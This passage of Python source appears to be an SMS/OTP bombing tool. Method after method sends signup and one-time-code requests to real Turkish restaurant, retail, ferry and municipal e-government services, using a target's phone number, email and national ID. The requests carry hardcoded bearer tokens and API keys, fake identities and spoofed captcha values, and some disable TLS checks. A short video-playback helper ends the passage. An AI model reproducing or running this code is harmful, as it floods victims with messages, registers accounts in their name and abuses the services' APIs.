            data = f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    

    def Beefull(self):
        service_name = "app.beefull.io"
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json_payload={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json_payload, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json_payload={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json_payload, timeout=4)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Dominos(self):
        service_name = "frontend.dominos.com.tr"
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQt5JD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po5lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json_payload={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("isSuccess") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Baydoner(self):
        service_name = "crmmobil.baydoner.com"
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Xsid": "2HB7FQ6G42QL", "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Os": "613A408535", "Accept-Language": "en-GB,en;q=0.9", "Merchantid": "5701", "Iskiosk": "0", "Sessionid": "", "Platform": "1", "Appv": "1.6.0", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json_payload={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31", "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": self.mail, "GDPRPolicy": False, "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "NotificationToken": "fBuxKYxj3k-qqVUcsvkj1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "", "SocialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 0, "TermsAndConditions": False}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("Control") == 1
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Pidem(self):
        service_name = "restashop.azurewebsites.net"
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
            json_payload={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Frink(self):
        service_name = "api.frink.com.tr"
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json_payload={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("processStatus") == "SUCCESS"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Bodrum(self):
        service_name = "gandalf.orwi.app"
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json_payload={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))     

    
    def KofteciYusuf(self):
        service_name = "gateway.poskofteciyusuf.com"
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            headers = {"Content-Type": "application/json; charset=utf-8", "Anonymousclientid": "", "Accept": "application/json", "Ostype": "iOS", "Appversion": "4.0.4.0", "Accept-Language": "en-GB,en;q=0.9", "Firmaid": "82", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Accept-Encoding": "gzip, deflate, br", "Language": "tr-TR", "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json_payload={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("Success") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Little(self):
        service_name = "api.littlecaesars.com.tr"
        try:
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFozY3pwdUY4TzVERTJwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDEzYVpsUlZXMThYSUJfNjRuY3daYnBPTHhaYlB0UWVuRnlsbjhsTWNSRVAxSHU5Qjlicjhod0FTajJkQ2t4NjVaOUtDT0dxYiIsImxjcmVmcmVzaHRva2VuIjoiNjQ1MmFkODM0M2NiNDdmYjlhZjFjNjNhMmFiMTEyZDMiLCJwZXJzb25lbWFpbCI6ImxjQGR1bW15LmNvbSIsInNjb3BlIjpbImxpdHRsZWNhZXNhcnNhcGkiLCJvZmZsaW5lX2FjY2VzcyJdLCJhbXIiOlsiNzY1NkJBRjNGMTVBNjUwNEJCRjNDRUU4MjkwOTJERkEiXX0.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg", "X-Platform": "ios", "X-Version": "1.0.0", "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json_payload={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200 and r.json().get("status") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))

    
    def Orwi(self):
        service_name = "gandalf.orwi.app"
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json_payload={"gsm": f"+90{self.phone}", "source": "orwi"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Coffy(self):
        service_name = "user-api-gw.coffy.com.tr"
        try:
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Language": "tr", "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"}
            json_payload={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Hamidiye(self):
        service_name = "bayi.hamidiye.istanbul"
        try:
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
            json_payload={"isGuest": False, "phone": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("result") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Fatih(self):
        service_name = "ebelediye.fatih.bel.tr"
        try:
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
            data = f"------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n28.12.1999\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Sancaktepe(self):
        service_name = "e-belediye.sancaktepe.bel.tr"
        try:
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
            data = f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Bayrampasa(self):
        service_name = "ebelediye.bayrampasa.bel.tr"
        try:
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
            data = f"------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n07.06.2000\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Money(self):
        service_name = "money.com.tr"
        try:
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            success = r.json().get("resultType") == 0
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Alixavien(self):
        service_name = "alixavien.com.tr"
        try:
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj", "Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json_payload={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("isError") == False
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Jimmykey(self):
        service_name = "jimmykey.com"
        try:
            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            success = r.json().get("Sonuc") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
        

    def Ido(self):
        service_name = "api.ido.com.tr"
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json_payload={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


# --- Pygame Video Oynatma Fonksiyonu (Ayrı Pencerede) ---
def play_video_pygame_in_separate_window(video_path):
    """
    Belirtilen videoyu Pygame kullanarak ayrı bir pencerede oynatır.
    Video oynatma sırasında Tkinter penceresi etkileşime kapalı kalır.
    """
    try:
        pygame.init()

        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            print(f"Hata: Video dosyası açılamadı veya bulunamadı: {video_path}")
            pygame.quit()
            return False

        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = cap.get(cv2.CAP_PROP_FPS)

        min_width, min_height = 640, 480
        display_width = max(width, min_width)
        display_height = max(height, min_height)

        screen = pygame.display.set_mode((display_width, display_height))
